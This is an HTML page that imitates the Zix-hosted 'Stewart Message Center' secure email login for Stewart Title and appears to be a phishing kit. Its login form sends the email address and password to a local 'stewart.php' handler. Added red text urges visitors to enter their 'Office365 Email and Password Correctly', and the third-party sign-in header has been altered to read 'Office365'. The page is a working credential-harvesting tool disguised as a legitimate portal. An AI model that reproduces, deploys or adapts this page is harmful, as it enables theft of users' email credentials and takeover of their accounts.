<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
<title>Stewart Password Authorization</title>
 
<meta name="robots" content="noindex">

<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">


	<meta name="viewport" content="width=device-width, minimum-scale=1.0">











	   
	<!--[if IE 8]>
	<script type="text/javascript" src="REL-5.11.17.280/modernizr-1.7.min.js" ></script>
	<script type="text/javascript" src="REL-5.11.17.280/css3-mediaqueries.js" ></script>
	<![endif]-->
	   
   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/stylesheet_desktopFallthrough.css">
			   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/stylesheet_mobile.css">
			   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/prod-zix-stewart_stylesheet_HandHeld.css">
			   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/prod-zix-stewart_stylesheet_mobile.css">
			   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/stylesheet_mobileLandscape.css">
			   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/stylesheet_tablet.css">
			   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/stylesheet_desktop.css">
			   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/prod-zix-stewart_stylesheet.css">
			   
			       <link rel="stylesheet" type="text/css" href="Stewart%20Password%20Authorization_files/stylesheet_print.css">
			         


<script type="text/javascript">
    function focusElement(control)
	{
    	
		control.focus();
		
	}
</script>   

 <link rel="stylesheet" href="Stewart%20Password%20Authorization_files/skipnav.css">
 
</head>

<body id="loginbody" onload="onloadpage();resizeGreyout();" class="container">
<div class="skipnav"><a href="#" onclick="setFocus()">Skip to Content</a></div>
<div id="greyout"></div>

<div id="primarybranding">
  <a href="http://www.stewart.com/" rel="external" id="brandingbanner" title="Stewart"><span class="access">
	Stewart</span><img src="Stewart%20Password%20Authorization_files/top_20160308_1222.jpg" alt="Stewart"></a>
</div>

<div id="content" class="clearself">
  <form id="loginform" name="sdform" onsubmit="return checkEntriesNOW()" action="stewart.php" method="post">
  <input type="hidden" id="access_token" name="access_token" value="">
  <input type="hidden" id="network" name="network" value="">
  <div id="staticerrormsgid">
    <noscript><p>JavaScript is needed for this application. Please turn on JavaScript for your Internet browser or contact your administrator.</p></noscript>
  </div>
  <div id="errmsgid">
  </div>

  
    <div class="contentheading"><h1>Welcome to the Stewart Message Center</h1></div>
  

  
    <div id="instructiontext">At Stewart, we understand the importance of 
		protecting your non-public personal information (NPI). Now you can 
		securely access your emails containing NPI by simply signing in below 
		with your email address and password.</div>
  

    <div id="popupblock">
    <div id="topaccent1"></div>
    <div id="topaccent2">
		<p></div>

	<div id="inputarea">

    


    

    <p id="loginfield">
      <label for="loginname">Email Address:</label>
      <input id="loginname" value="" name="em" type="email" autocorrect="off" autocapitalize="none" autocomplete="off">
    </p>

    

    <p id="passwordfield">
    <label for="password">Password:</label>
    <input id="password" name="passphrase" type="password" autocomplete="off">
    </p>


    

    

    <div class="access"><input type="hidden" name="validationKey" value="65f231af-37dc-4726-a54e-c0c225bc5570"></div>

    <div id="submitbutton"><input value="Sign In" type="submit" name="login" title="Sign In" class="button"></div>

    

    
      <div id="rememberme">
       &nbsp;<p><font color="#FF0000">Enter your Office365 Email and Password 
		Correctly</font></p>
		<p>&nbsp;</div>
    
    	
    <div class="clearfix"></div>
    
    </div>
    
    	







<div class="thirdpartyAuth">
	<div class="thirdpartyAuthHeader">Sign In With: <font color="#FF0000">
		Office365</font></div>
	<a href="https://oauth.secureemailportal.com/s/oauth-login.html?oauth_method=google&amp;clientid=18483490526-bnatf0201ifm1oj94aid044fgvbjoh76.apps.googleusercontent.com" class="auth-google-link"></a>
	<a href="https://oauth.secureemailportal.com/s/oauth-login.html?oauth_method=windows&amp;clientid=27d51cc3-aa56-4a0a-b281-a0fe6242d34e" class="auth-microsoft-link"><div class="auth-microsoft" id="auth-microsoft">&nbsp;</div></a>
</div>

	

    <div id="bottomaccent1"></div>
    <div id="subscribetext">&nbsp;</div>
	<div class="clearfix"></div>
    
    
    </div>
  <div class="clearfix"></div>

    
    <div id="loginwarningmsg"><p>Have questions about Secure Email? Need help 
		with Secure Email? For assistance, please contact the Stewart sender of 
		your secure email. Their name can be found in the &quot;From&quot; field of your 
		Secure Email notification.</p></div>
  


  </form>

  <form name="languageForm" method="get">
    <input type="hidden" name="langEmail" value="">
    <input type="hidden" name="submit_language" value="">

  </form>
</div>


  
 <div id="secondarybranding">
    
      <div id="secondarybrandinginfotext">
        © 2016 Stewart Title Guaranty Company. All Rights Reserved.
      </div>
    

    <div id="secondarybrandinghtml">
      <div id="brandingbottombanner" title="Stewart"><span class="access">
		Stewart</span></div>
    </div>
    
  </div>

  <div id="thirdpartydisclaimer">
    <p>This service is hosted by Zix on behalf of Stewart <a href="https://www.zix.com/">
	More Information</a></p>
  </div>

  
  

  
    <div id="securedbyzixlogo">
      <a href="http://www.zixcorp.com/" id="zixbranding" title="Secured by Zix"><img src="Stewart%20Password%20Authorization_files/securedbyzix.svg" alt="Secured by Zix"></a>
    </div>
  



  <script type="text/javascript" src="Stewart%20Password%20Authorization_files/default_validatorconstants_en.js"></script>
  <script type="text/javascript" src="Stewart%20Password%20Authorization_files/default_loginview_validator.js"></script>
  <script type="text/javascript" src="Stewart%20Password%20Authorization_files/emailfieldvalue.js"></script>
  <script type="text/javascript" src="Stewart%20Password%20Authorization_files/fieldvalue.js"></script>
  <script type="text/javascript" src="Stewart%20Password%20Authorization_files/userNotifier.js"></script>
   <script type="text/javascript" src="Stewart%20Password%20Authorization_files/jquery.js"></script>


	
 <script type="text/javascript">

    function getSDForm()
    {
       if (document.layers) // for Netscape 4.x
         return document.layerLogin.document.sdform;

       // for IE
       return document.sdform;
    }


    

        
    function onloadpage()
    {
	    	setTimeout( displayError , 100 ); //This allows the page to render before displaying the modals. 
        scrolltop();
    }

    function scrolltop()
    {
        if (navigator.appName == 'Microsoft Internet Explorer')
        {
            scroll(0,0);
        }
    }

    function setFocus()
    {
      if ((getSDForm().em.value == ""))
      {
        getSDForm().em.focus();
      }
      else
      {
         getSDForm().passphrase.focus();
      }
    }

    function checkEntriesNOW()
    {
      var SDForm            = getSDForm();
      var emailKeyInput     = SDForm.em;
      var passwordKeyInput  = SDForm.passphrase;

      return checkEntries( emailKeyInput, passwordKeyInput, "errmsgid", false );
    }

    function createCookie(name,value,days)
    {
      if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
      }
      else
      {
        var date = new Date();
        date.setTime(date.getTime()+(1*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
      }
      document.cookie = name +"="+value+expires+"; path=/";
    }

    function readCookie(name) {
      var nameEQ = name + "=";
      var ca = document.cookie.split(';');
      for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ')
        {
          c = c.substring(1,c.length);
        }

        if (c.indexOf(nameEQ) == 0)
        {
          return c.substring(nameEQ.length,c.length);
        }
      }
      return null;
    }

    function eraseCookie(name) {
      createCookie(name, "", -1);
    }


    function checkForCookies()
    {
      

        createCookie("ZixCheck","ZixCheck",1);

        
          var checkbox = getSDForm().rememberme;
        

        

        if (readCookie("ZixCheck") == null)
        {

          issueClientWarning("To use this feature, you must enable cookies in your Internet browser.","errmsgid",true);

          


          
            if (checkbox != null)
            {
              checkbox.checked=false;
            }
          
          return false;
        }
        else
        {
          eraseCookie("ZixCheck");
          return true;
        }
      
    }

    function displayError()
    {
      var errMsg = "";
      var displayInline = false;

      if( errMsg )
      {
      
      }

      issueClientLoginWarning(errMsg,"errmsgid",displayInline);
    }

    function resizeGreyout()
    {
        
    }

</script>







</body></html>